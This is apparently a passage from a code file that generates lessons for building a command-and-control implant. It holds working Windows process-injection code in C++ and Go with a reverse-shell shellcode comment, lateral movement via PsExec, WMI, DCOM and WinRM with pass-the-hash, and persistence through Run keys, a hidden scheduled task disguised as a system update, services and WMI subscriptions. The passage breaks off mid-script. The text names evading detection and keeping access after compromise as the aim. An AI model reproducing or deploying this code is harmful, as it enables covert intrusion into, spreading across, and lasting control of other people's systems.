                    UPDATE tasks
                    SET status = ?, {timestamp_field} = ?
                    WHERE id = ?
                ''', (status.value, datetime.utcnow().isoformat(), task_id))
            else:
                conn.execute('''
                    UPDATE tasks SET status = ? WHERE id = ?
                ''', (status.value, task_id))
            conn.commit()
            conn.close()

    def store_result(self, result: TaskResult):
        """Store task result from beacon"""

        with self.lock:
            conn = sqlite3.connect(self.db_path)

            # Store result
            conn.execute('''
                INSERT OR REPLACE INTO results VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (
                result.task_id, result.beacon_id, result.output,
                result.error, result.exit_code,
                result.received_at.isoformat(), result.execution_time
            ))

            # Update task status
            status = TaskStatus.COMPLETED if result.exit_code == 0 else TaskStatus.FAILED
            conn.execute('''
                UPDATE tasks
                SET status = ?, completed_at = ?
                WHERE id = ?
            ''', (status.value, datetime.utcnow().isoformat(), result.task_id))

            conn.commit()
            conn.close()

        print(f"[+] Result received for task {result.task_id[:8]}")

    def get_result(self, task_id: str) -> Optional[TaskResult]:
        """Get result for a specific task"""

        with self.lock:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.execute('''
                SELECT * FROM results WHERE task_id = ?
            ''', (task_id,))
            row = cursor.fetchone()
            conn.close()

            if row:
                return TaskResult(
                    task_id=row[0],
                    beacon_id=row[1],
                    output=row[2],
                    error=row[3],
                    exit_code=row[4],
                    received_at=datetime.fromisoformat(row[5]),
                    execution_time=row[6]
                )
        return None

    def get_beacon_tasks(self, beacon_id: str, limit: int = 50) -> List[Dict]:
        """Get task history for a beacon"""

        with self.lock:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.execute('''
                SELECT t.*, r.output, r.error, r.exit_code
                FROM tasks t
                LEFT JOIN results r ON t.id = r.task_id
                WHERE t.beacon_id = ?
                ORDER BY t.created_at DESC
                LIMIT ?
            ''', (beacon_id, limit))

            tasks = []
            for row in cursor.fetchall():
                tasks.append({
                    'id': row[0],
                    'type': row[2],
                    'args': json.loads(row[3]),
                    'status': row[4],
                    'created_at': row[5],
                    'output': row[11] if len(row) > 11 else None,
                    'error': row[12] if len(row) > 12 else None,
                    'exit_code': row[13] if len(row) > 13 else None
                })
            conn.close()

        return tasks

    def _row_to_task(self, row) -> Task:
        return Task(
            id=row[0],
            beacon_id=row[1],
            task_type=TaskType(row[2]),
            args=json.loads(row[3]),
            status=TaskStatus(row[4]),
            created_at=datetime.fromisoformat(row[5]) if row[5] else None,
            queued_at=datetime.fromisoformat(row[6]) if row[6] else None,
            started_at=datetime.fromisoformat(row[7]) if row[7] else None,
            completed_at=datetime.fromisoformat(row[8]) if row[8] else None,
            operator=row[9],
            timeout=row[10]
        )


# Example usage
queue = TaskQueue()

# Queue a shell command
task = queue.queue_task(
    beacon_id="abc123",
    task_type=TaskType.SHELL,
    args=["whoami /all"],
    operator="operator1"
)

# Beacon checks in and gets pending tasks
pending = queue.get_pending_tasks("abc123")
print(f"Pending tasks: {[t.to_dict() for t in pending]}")

# Beacon returns result
result = TaskResult(
    task_id=task.id,
    beacon_id="abc123",
    output="DOMAIN\\\\user",
    exit_code=0,
    execution_time=0.5
)
queue.store_result(result)

# Operator views result
stored_result = queue.get_result(task.id)
print(f"Output: {stored_result.output}")
\`\`\`

### Key Concepts

- **Task Lifecycle**: pending → queued → running → completed/failed
- **Unique IDs**: UUID for each task enables tracking and deduplication
- **Persistence**: SQLite storage survives server restarts
- **Structured Results**: stdout, stderr, exit code, execution time
- **Operator Attribution**: Track who queued each task

### Practice Tasks

- [ ] Define task data structures with all required fields
- [ ] Implement SQLite persistence for tasks and results
- [ ] Build queue_task for adding new tasks
- [ ] Implement get_pending_tasks for beacon check-in
- [ ] Add status update tracking with timestamps
- [ ] Build result storage and retrieval
- [ ] Implement task history queries
- [ ] Add task cancellation support

### Completion Criteria

- [ ] Tasks persist across server restarts
- [ ] Status transitions are tracked correctly
- [ ] Results are stored with all metadata
- [ ] Operators can view task history
- [ ] Concurrent access is handled safely`],
		['Add process injection', 'Inject shellcode using: 1) CreateRemoteThread with VirtualAllocEx, 2) QueueUserAPC for early bird injection, 3) NtMapViewOfSection for process hollowing. Target processes like explorer.exe, svchost.exe.', `## Overview

Implement process injection techniques to execute shellcode in the context of another process. This enables hiding malicious code in legitimate processes and evading detection by running in trusted contexts.

### Injection Techniques Comparison

\`\`\`
Technique          | Detection | Stability | Use Case
-------------------|-----------|-----------|-------------------
CreateRemoteThread | High      | High      | Quick & reliable
QueueUserAPC       | Medium    | Medium    | Early execution
Process Hollowing  | Medium    | Low       | Clean process
Thread Hijacking   | Low       | Low       | Stealthy execution
\`\`\`

### Implementation

\`\`\`cpp
// process_injection.cpp - Windows process injection techniques
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>

class ProcessInjector {
public:
    // Find process by name
    static DWORD FindProcess(const wchar_t* processName) {
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snapshot == INVALID_HANDLE_VALUE) return 0;

        PROCESSENTRY32W pe32;
        pe32.dwSize = sizeof(pe32);

        if (Process32FirstW(snapshot, &pe32)) {
            do {
                if (_wcsicmp(pe32.szExeFile, processName) == 0) {
                    CloseHandle(snapshot);
                    return pe32.th32ProcessID;
                }
            } while (Process32NextW(snapshot, &pe32));
        }

        CloseHandle(snapshot);
        return 0;
    }

    // Technique 1: CreateRemoteThread
    // Most common, well-documented, but easily detected
    static bool InjectCreateRemoteThread(DWORD pid, LPVOID shellcode, SIZE_T size) {
        HANDLE hProcess = OpenProcess(
            PROCESS_ALL_ACCESS,
            FALSE,
            pid
        );
        if (!hProcess) return false;

        // Allocate memory in target process
        LPVOID remoteBuffer = VirtualAllocEx(
            hProcess,
            NULL,
            size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );
        if (!remoteBuffer) {
            CloseHandle(hProcess);
            return false;
        }

        // Write shellcode to allocated memory
        SIZE_T bytesWritten;
        if (!WriteProcessMemory(hProcess, remoteBuffer, shellcode, size, &bytesWritten)) {
            VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }

        // Create remote thread to execute shellcode
        HANDLE hThread = CreateRemoteThread(
            hProcess,
            NULL,
            0,
            (LPTHREAD_START_ROUTINE)remoteBuffer,
            NULL,
            0,
            NULL
        );

        if (!hThread) {
            VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }

        // Wait for execution (optional)
        WaitForSingleObject(hThread, INFINITE);

        CloseHandle(hThread);
        CloseHandle(hProcess);
        return true;
    }

    // Technique 2: QueueUserAPC (Early Bird)
    // Queue APC to thread before it starts - executes during alertable state
    static bool InjectQueueUserAPC(const wchar_t* targetPath, LPVOID shellcode, SIZE_T size) {
        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi;

        // Create process in suspended state
        if (!CreateProcessW(
            targetPath,
            NULL,
            NULL,
            NULL,
            FALSE,
            CREATE_SUSPENDED,
            NULL,
            NULL,
            &si,
            &pi
        )) {
            return false;
        }

        // Allocate memory in new process
        LPVOID remoteBuffer = VirtualAllocEx(
            pi.hProcess,
            NULL,
            size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );

        if (!remoteBuffer) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return false;
        }

        // Write shellcode
        WriteProcessMemory(pi.hProcess, remoteBuffer, shellcode, size, NULL);

        // Queue APC to main thread
        if (!QueueUserAPC(
            (PAPCFUNC)remoteBuffer,
            pi.hThread,
            NULL
        )) {
            VirtualFreeEx(pi.hProcess, remoteBuffer, 0, MEM_RELEASE);
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return false;
        }

        // Resume thread - APC executes when thread enters alertable state
        ResumeThread(pi.hThread);

        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return true;
    }

    // Technique 3: Process Hollowing (RunPE)
    // Replace legitimate process memory with malicious code
    static bool InjectProcessHollowing(const wchar_t* targetPath,
                                       LPVOID payload, SIZE_T payloadSize) {
        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi;

        // Create suspended process
        if (!CreateProcessW(
            targetPath,
            NULL,
            NULL,
            NULL,
            FALSE,
            CREATE_SUSPENDED,
            NULL,
            NULL,
            &si,
            &pi
        )) {
            return false;
        }

        // Get thread context to find image base
        CONTEXT ctx;
        ctx.ContextFlags = CONTEXT_FULL;
        GetThreadContext(pi.hThread, &ctx);

        // Read PEB to get image base (64-bit)
        LPVOID pebImageBase = (LPVOID)(ctx.Rdx + 0x10);
        LPVOID imageBase;
        ReadProcessMemory(pi.hProcess, pebImageBase, &imageBase, sizeof(LPVOID), NULL);

        // Unmap original executable
        typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, LPVOID);
        pNtUnmapViewOfSection NtUnmapViewOfSection =
            (pNtUnmapViewOfSection)GetProcAddress(
                GetModuleHandleW(L"ntdll.dll"),
                "NtUnmapViewOfSection"
            );
        NtUnmapViewOfSection(pi.hProcess, imageBase);

        // Allocate memory at same base address
        LPVOID newBase = VirtualAllocEx(
            pi.hProcess,
            imageBase,
            payloadSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );

        // Write payload
        WriteProcessMemory(pi.hProcess, newBase, payload, payloadSize, NULL);

        // Update thread context with new entry point
        // (Requires parsing PE headers to find entry point)
        // ctx.Rcx = (DWORD64)newBase + entryPointRVA;
        SetThreadContext(pi.hThread, &ctx);

        // Resume execution
        ResumeThread(pi.hThread);

        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return true;
    }

    // Technique 4: Thread Hijacking
    // Suspend existing thread, modify its context to run shellcode
    static bool InjectThreadHijack(DWORD pid, DWORD tid, LPVOID shellcode, SIZE_T size) {
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);

        if (!hProcess || !hThread) {
            if (hProcess) CloseHandle(hProcess);
            if (hThread) CloseHandle(hThread);
            return false;
        }

        // Allocate and write shellcode
        LPVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, size,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        WriteProcessMemory(hProcess, remoteBuffer, shellcode, size, NULL);

        // Suspend target thread
        SuspendThread(hThread);

        // Get thread context
        CONTEXT ctx;
        ctx.ContextFlags = CONTEXT_FULL;
        GetThreadContext(hThread, &ctx);

        // Save original RIP and point to shellcode
        // Shellcode should restore RIP when done
        ctx.Rip = (DWORD64)remoteBuffer;

        SetThreadContext(hThread, &ctx);
        ResumeThread(hThread);

        CloseHandle(hThread);
        CloseHandle(hProcess);
        return true;
    }
};

// Usage example
int main() {
    // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f c
    unsigned char shellcode[] = { /* shellcode bytes */ };
    SIZE_T shellcodeSize = sizeof(shellcode);

    // Method 1: Inject into explorer.exe
    DWORD explorerPid = ProcessInjector::FindProcess(L"explorer.exe");
    if (explorerPid) {
        ProcessInjector::InjectCreateRemoteThread(explorerPid, shellcode, shellcodeSize);
    }

    // Method 2: Early bird injection
    ProcessInjector::InjectQueueUserAPC(
        L"C:\\\\Windows\\\\System32\\\\notepad.exe",
        shellcode,
        shellcodeSize
    );

    return 0;
}
\`\`\`

### Go Implementation (Cross-platform agent)

\`\`\`go
package injection

import (
    "syscall"
    "unsafe"
)

var (
    kernel32 = syscall.NewLazyDLL("kernel32.dll")
    ntdll    = syscall.NewLazyDLL("ntdll.dll")

    procOpenProcess        = kernel32.NewProc("OpenProcess")
    procVirtualAllocEx     = kernel32.NewProc("VirtualAllocEx")
    procWriteProcessMemory = kernel32.NewProc("WriteProcessMemory")
    procCreateRemoteThread = kernel32.NewProc("CreateRemoteThreadEx")
    procCloseHandle        = kernel32.NewProc("CloseHandle")
)

const (
    PROCESS_ALL_ACCESS     = 0x1F0FFF
    MEM_COMMIT             = 0x1000
    MEM_RESERVE            = 0x2000
    PAGE_EXECUTE_READWRITE = 0x40
)

func InjectShellcode(pid uint32, shellcode []byte) error {
    // Open target process
    hProcess, _, err := procOpenProcess.Call(
        uintptr(PROCESS_ALL_ACCESS),
        0,
        uintptr(pid),
    )
    if hProcess == 0 {
        return err
    }
    defer procCloseHandle.Call(hProcess)

    // Allocate memory
    addr, _, err := procVirtualAllocEx.Call(
        hProcess,
        0,
        uintptr(len(shellcode)),
        MEM_COMMIT|MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    )
    if addr == 0 {
        return err
    }

    // Write shellcode
    var bytesWritten uintptr
    procWriteProcessMemory.Call(
        hProcess,
        addr,
        uintptr(unsafe.Pointer(&shellcode[0])),
        uintptr(len(shellcode)),
        uintptr(unsafe.Pointer(&bytesWritten)),
    )

    // Create remote thread
    procCreateRemoteThread.Call(
        hProcess,
        0, 0,
        addr,
        0, 0, 0,
    )

    return nil
}
\`\`\`

### Key Concepts

- **VirtualAllocEx**: Allocate memory in remote process
- **WriteProcessMemory**: Write shellcode to allocated memory
- **CreateRemoteThread**: Execute shellcode in new thread
- **QueueUserAPC**: Queue code for alertable thread execution
- **Process Hollowing**: Replace process memory entirely

### Practice Tasks

- [ ] Implement process enumeration to find targets
- [ ] Build CreateRemoteThread injection
- [ ] Add QueueUserAPC early bird injection
- [ ] Implement basic process hollowing
- [ ] Add error handling and cleanup
- [ ] Implement thread hijacking
- [ ] Build Go version for cross-compilation

### Completion Criteria

- [ ] Successfully inject into running process
- [ ] Early bird injection works on new processes
- [ ] Process hollowing creates clean process
- [ ] Handle injection failures gracefully
- [ ] Shellcode executes in target context`],
		['Build lateral movement', 'Move laterally via: WMI Win32_Process.Create(), SMB PsExec-style service creation, WinRM New-PSSession, and DCOM MMC20.Application ExecuteShellCommand. Pass credentials or use current token.', `## Overview

Implement multiple lateral movement techniques to execute commands on remote systems using different protocols and methods. Each technique has different requirements, detection signatures, and use cases.

### Lateral Movement Matrix

\`\`\`
Technique   | Port     | Auth       | Stealth | Artifacts
------------|----------|------------|---------|-------------------
PsExec      | 445      | Pass creds | Low     | Service, exe file
WMI         | 135+dyn  | Pass creds | Medium  | WMI event logs
WinRM       | 5985/6   | Pass creds | Medium  | PowerShell logs
DCOM        | 135+dyn  | Current    | Medium  | DCOM event logs
\`\`\`

### Implementation

\`\`\`python
import os
import sys
import time
import subprocess
from typing import Optional, Tuple
from impacket.smbconnection import SMBConnection
from impacket.dcerpc.v5 import transport, scmr, wmi, dcomrt
from impacket.dcerpc.v5.dcom import wmi as dcom_wmi
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dtypes import NULL

class LateralMovement:
    """Lateral movement techniques for remote command execution"""

    def __init__(self, target: str, username: str, password: str = None,
                 nt_hash: str = None, domain: str = ''):
        self.target = target
        self.username = username
        self.password = password
        self.nt_hash = nt_hash
        self.domain = domain

    # ========== PsExec Style (SMB Service Creation) ==========

    def psexec(self, command: str, share: str = 'ADMIN$') -> Tuple[str, str]:
        """
        Execute command via service creation (like Sysinternals PsExec)
        1. Copy executable to share
        2. Create and start remote service
        3. Capture output via named pipe
        4. Cleanup
        """
        # Connect to SMB
        smb = SMBConnection(self.target, self.target)
        if self.nt_hash:
            lmhash, nthash = '', self.nt_hash
            smb.login(self.username, '', self.domain, lmhash, nthash)
        else:
            smb.login(self.username, self.password, self.domain)

        # Create service executable that runs our command
        service_name = f"svc{os.urandom(4).hex()}"
        exe_name = f"{service_name}.exe"

        # Upload service binary to ADMIN$
        # (In practice, use a service wrapper exe or RemComSvc)
        local_exe = self._create_service_exe(command)

        try:
            smb.putFile(share, exe_name, open(local_exe, 'rb').read)
        except Exception as e:
            return '', f"Upload failed: {e}"

        # Connect to SCM and create service
        rpc_transport = transport.DCERPCTransportFactory(
            f'ncacn_np:{self.target}[\\pipe\\svcctl]'
        )
        rpc_transport.set_credentials(
            self.username, self.password, self.domain,
            '', self.nt_hash
        )

        dce = rpc_transport.get_dce_rpc()
        dce.connect()
        dce.bind(scmr.MSRPC_UUID_SCMR)

        # Open SCM
        scm_handle = scmr.hROpenSCManagerW(dce)['lpScHandle']

        # Create service
        service_path = f'%SystemRoot%\\{exe_name}'
        try:
            scmr.hRCreateServiceW(
                dce, scm_handle, service_name, service_name,
                lpBinaryPathName=service_path,
                dwStartType=scmr.SERVICE_DEMAND_START
            )
        except Exception as e:
            return '', f"Service creation failed: {e}"

        # Open and start service
        service_handle = scmr.hROpenServiceW(dce, scm_handle, service_name)['lpServiceHandle']

        try:
            scmr.hRStartServiceW(dce, service_handle)
        except Exception:
            pass  # Service may return error but still execute

        # Wait for execution
        time.sleep(2)

        # Read output (if using output-capturing service wrapper)
        output = self._read_output(smb, share)

        # Cleanup: stop, delete service, remove file
        try:
            scmr.hRControlService(dce, service_handle, scmr.SERVICE_CONTROL_STOP)
        except:
            pass

        scmr.hRDeleteService(dce, service_handle)
        smb.deleteFile(share, exe_name)

        return output, ''

    # ========== WMI Execution ==========

    def wmiexec(self, command: str) -> Tuple[str, str]:
        """
        Execute command via WMI Win32_Process.Create()
        Output written to file on C$ share, then read and deleted
        """
        # Output file for capturing results
        output_file = f'windows\\temp\\{os.urandom(4).hex()}.txt'

        # Wrap command to redirect output
        full_command = f'cmd.exe /c {command} > C:\\{output_file} 2>&1'

        # Connect to WMI via DCOM
        dcom = DCOMConnection(
            self.target,
            self.username,
            self.password,
            self.domain,
            self.nt_hash
        )

        iInterface = dcom.CoCreateInstanceEx(
            dcom_wmi.CLSID_WbemLevel1Login,
            dcom_wmi.IID_IWbemLevel1Login
        )
        iWbemLevel1Login = dcom_wmi.IWbemLevel1Login(iInterface)
        iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)

        # Get Win32_Process class
        win32Process, _ = iWbemServices.GetObject('Win32_Process')

        # Call Create method
        result = win32Process.Create(full_command, 'C:\\', None)
        return_value = result.getProperties()['ReturnValue']['value']

        if return_value != 0:
            return '', f"Process creation failed: {return_value}"

        # Wait for execution
        time.sleep(2)

        # Read output via SMB
        smb = SMBConnection(self.target, self.target)
        smb.login(self.username, self.password, self.domain, '', self.nt_hash)

        try:
            output = ''
            fh = io.BytesIO()
            smb.getFile('C$', output_file, fh.write)
            output = fh.getvalue().decode('utf-8', errors='replace')
            smb.deleteFile('C$', output_file)
        except Exception as e:
            return '', f"Output retrieval failed: {e}"

        return output, ''

    # ========== DCOM Execution ==========

    def dcomexec(self, command: str, method: str = 'MMC20') -> Tuple[str, str]:
        """
        Execute command via DCOM object methods
        Methods: MMC20.Application, ShellWindows, ShellBrowserWindow
        """
        dcom = DCOMConnection(
            self.target,
            self.username,
            self.password,
            self.domain,
            self.nt_hash
        )

        if method == 'MMC20':
            # MMC20.Application ExecuteShellCommand
            iInterface = dcom.CoCreateInstanceEx(
                '{49B2791A-B1AE-4C90-9B8E-E860BA07F889}',  # MMC20.Application
                '{C0C5EA20-E35A-11CE-8788-00805F2CD084}'   # IDispatch
            )
            iMMC = iInterface.QueryInterface(
                '{C0C5EA20-E35A-11CE-8788-00805F2CD064}'
            )

            # Get Document property
            document = iMMC.QueryProperty('Document')
            # Get ActiveView
            active_view = document.QueryProperty('ActiveView')
            # ExecuteShellCommand(command, directory, parameters, windowState)
            active_view.ExecuteShellCommand(
                'cmd.exe', '/', f'/c {command}', '7'  # 7 = minimized
            )

        elif method == 'ShellWindows':
            # ShellWindows (uses explorer.exe context)
            iInterface = dcom.CoCreateInstanceEx(
                '{9BA05972-F6A8-11CF-A442-00A0C90A8F39}',  # ShellWindows
                '{C0C5EA20-E35A-11CE-8788-00805F2CD084}'
            )
            iShellWindows = iInterface.QueryInterface(
                '{85CB6900-4D95-11CF-960C-0080C7F4EE85}'
            )

            item = iShellWindows.Item()
            doc = item.QueryProperty('Document')
            app = doc.QueryProperty('Application')
            app.ShellExecute(command, '', '', 'open', 0)

        return 'Command executed (no output capture for DCOM)', ''

    # ========== WinRM Execution ==========

    def winrmexec(self, command: str) -> Tuple[str, str]:
        """Execute command via WinRM using pywinrm"""
        import winrm

        session = winrm.Session(
            self.target,
            auth=(f'{self.domain}\\{self.username}', self.password),
            transport='ntlm'
        )

        result = session.run_cmd(command)

        return (
            result.std_out.decode('utf-8', errors='replace'),
            result.std_err.decode('utf-8', errors='replace')
        )

    def winrmexec_ps(self, script: str) -> Tuple[str, str]:
        """Execute PowerShell script via WinRM"""
        import winrm

        session = winrm.Session(
            self.target,
            auth=(f'{self.domain}\\{self.username}', self.password),
            transport='ntlm'
        )

        result = session.run_ps(script)

        return (
            result.std_out.decode('utf-8', errors='replace'),
            result.std_err.decode('utf-8', errors='replace')
        )


# Usage examples
lm = LateralMovement(
    target='192.168.1.100',
    username='admin',
    password='Password123',
    domain='CORP'
)

# PsExec style
stdout, stderr = lm.psexec('whoami /all')

# WMI execution (stealthier)
stdout, stderr = lm.wmiexec('ipconfig /all')

# DCOM execution
stdout, stderr = lm.dcomexec('calc.exe', method='MMC20')

# WinRM execution
stdout, stderr = lm.winrmexec('hostname')
\`\`\`

### Key Concepts

- **PsExec**: Service-based, leaves artifacts but reliable
- **WMI**: Uses DCOM, output via file share, fewer artifacts
- **DCOM**: Application-based, uses existing processes
- **WinRM**: PowerShell remoting, logged but legitimate

### Practice Tasks

- [ ] Implement SMB connection with pass-the-hash
- [ ] Build PsExec-style service creation
- [ ] Add WMI Win32_Process.Create execution
- [ ] Implement output capture via file share
- [ ] Build DCOM MMC20.Application method
- [ ] Add ShellWindows DCOM method
- [ ] Integrate WinRM execution
- [ ] Add credential handling (password, hash, ticket)

### Completion Criteria

- [ ] All four techniques execute commands successfully
- [ ] Pass-the-hash works with all methods
- [ ] Output capture works for applicable methods
- [ ] Cleanup removes artifacts properly
- [ ] Error handling for access denied/unreachable`],
		['Implement persistence', 'Maintain access via: Registry Run keys (HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run), Scheduled Tasks (schtasks /create), Services (sc create), and WMI event subscriptions.', `## Overview

Implement persistence mechanisms to maintain access after initial compromise. Each technique has different privilege requirements, detection signatures, and reliability.

### Persistence Comparison

\`\`\`
Technique        | Privilege | Survives | Detection   | Reliability
-----------------|-----------|----------|-------------|------------
Registry Run     | User      | Reboot   | Low         | High
Scheduled Task   | User/Admin| Reboot   | Medium      | High
Service          | Admin     | Reboot   | Medium      | High
WMI Subscription | Admin     | Reboot   | Low         | Medium
Startup Folder   | User      | Reboot   | Low         | High
\`\`\`

### Implementation

\`\`\`python
import os
import subprocess
import winreg
from datetime import datetime, timedelta
from typing import Optional

class PersistenceManager:
    """Windows persistence mechanisms"""

    def __init__(self, payload_path: str):
        self.payload_path = payload_path

    # ========== Registry Run Keys ==========

    def add_registry_run(self, name: str, hive: str = 'HKCU') -> bool:
        """
        Add registry Run key for user/system persistence
        HKCU: Runs as current user on login
        HKLM: Runs as SYSTEM on boot (requires admin)
        """
        if hive == 'HKCU':
            key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            root = winreg.HKEY_CURRENT_USER
        else:
            key_path = r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
            root = winreg.HKEY_LOCAL_MACHINE

        try:
            key = winreg.OpenKey(root, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, name, 0, winreg.REG_SZ, self.payload_path)
            winreg.CloseKey(key)
            return True
        except Exception as e:
            print(f"Registry persistence failed: {e}")
            return False

    def add_registry_runonce(self, name: str) -> bool:
        """Add RunOnce key (executes once then deleted)"""
        key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"

        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, name, 0, winreg.REG_SZ, self.payload_path)
            winreg.CloseKey(key)
            return True
        except Exception as e:
            print(f"RunOnce persistence failed: {e}")
            return False

    def remove_registry_run(self, name: str, hive: str = 'HKCU') -> bool:
        """Remove registry Run key"""
        if hive == 'HKCU':
            key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            root = winreg.HKEY_CURRENT_USER
        else:
            key_path = r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
            root = winreg.HKEY_LOCAL_MACHINE

        try:
            key = winreg.OpenKey(root, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, name)
            winreg.CloseKey(key)
            return True
        except Exception as e:
            return False

    # ========== Scheduled Tasks ==========

    def add_scheduled_task(self, task_name: str, trigger: str = 'logon',
                           user: str = None) -> bool:
        """
        Create scheduled task for persistence
        Triggers: logon, startup, daily, onstart
        """
        # Build schtasks command
        cmd = [
            'schtasks', '/create',
            '/tn', task_name,
            '/tr', self.payload_path,
            '/f'  # Force overwrite
        ]

        if trigger == 'logon':
            cmd.extend(['/sc', 'onlogon'])
        elif trigger == 'startup':
            cmd.extend(['/sc', 'onstart'])
        elif trigger == 'daily':
            cmd.extend(['/sc', 'daily', '/st', '09:00'])
        elif trigger == 'idle':
            cmd.extend(['/sc', 'onidle', '/i', '10'])

        if user:
            cmd.extend(['/ru', user])

        try:
            result = subprocess.run(cmd, capture_output=True, text=True)
            return result.returncode == 0
        except Exception as e:
            print(f"Scheduled task creation failed: {e}")
            return False

    def add_scheduled_task_xml(self, task_name: str) -> bool:
        """Create scheduled task from XML (more options)"""
        xml_template = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>System Update Task</Description>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <Hidden>true</Hidden>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>{self.payload_path}</Command>
    </Exec>
  </Actions>
</Task>'''

        # Write XML to temp file
        xml_path = os.path.join(os.environ['TEMP'], f'{task_name}.xml')
        with open(xml_path, 'w', encoding='utf-16') as f:
            f.write(xml_template)

        try:
            result = subprocess.run(
                ['schtasks', '/create', '/tn', task_name, '/xml', xml_path, '/f'],
                capture_output=True
            )
            os.remove(xml_path)
            return result.returncode == 0
        except Exception as e:
            return False

    def remove_scheduled_task(self, task_name: str) -> bool:
        """Remove scheduled task"""
        try:
            result = subprocess.run(
                ['schtasks', '/delete', '/tn', task_name, '/f'],
                capture_output=True
            )
            return result.returncode == 0
        except:
            return False

    # ========== Windows Services ==========

    def add_service(self, service_name: str, display_name: str = None) -> bool:
        """
        Create Windows service for persistence (requires admin)
        Service runs as SYSTEM by default
        """
        if not display_name:
            display_name = service_name

        try:
            result = subprocess.run([
                'sc', 'create', service_name,
                f'binPath= "{self.payload_path}"',
                f'DisplayName= "{display_name}"',
                'start= auto'  # Start automatically
            ], capture_output=True, text=True)

            if result.returncode == 0:
                # Set service to restart on failure
                subprocess.run([
                    'sc', 'failure', service_name,
                    'reset= 0',
                    'actions= restart/5000/restart/5000/restart/5000'
                ], capture_output=True)

                # Start service
                subprocess.run(['sc', 'start', service_name], capture_output=True)
                return True

            return False
        except Exception as e:
            print(f"Service creation failed: {e}")
            return False

    def remove_service(self, service_name: str) -> bool:
        """Remove Windows service"""
        try:
            subprocess.run(['sc', 'stop', service_name], capture_output=True)
            result = subprocess.run(
                ['sc', 'delete', service_name],
                capture_output=True
            )
            return result.returncode == 0
        except:
            return False

    # ========== WMI Event Subscription ==========

    def add_wmi_subscription(self, name: str, trigger: str = 'startup') -> bool:
        """
        Create WMI event subscription for fileless persistence
        Very stealthy - no files on disk after initial setup
        """
        # PowerShell to create WMI subscription
        if trigger == 'startup':
            # Trigger on system startup
            query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 320"
        elif trigger == 'logon':
            # Trigger on user logon
            query = "SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstance ISA 'Win32_LogonSession' AND TargetInstance.LogonType = 2"
        elif trigger == 'process':
            # Trigger when specific process starts
            query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'explorer.exe'"

        ps_script = f'''
$FilterName = "{name}_Filter"
$ConsumerName = "{name}_Consumer"
$SubscriptionName = "{name}_Subscription"

# Create Event Filter
$Filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{{
    Name = $FilterName
    EventNamespace = "root\\cimv2"
    QueryLanguage = "WQL"
    Query = "{query}"
}}

# Create Command Line Event Consumer
$Consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{{
    Name = $ConsumerName
    CommandLineTemplate = "{self.payload_path}"
}}

# Bind Filter to Consumer
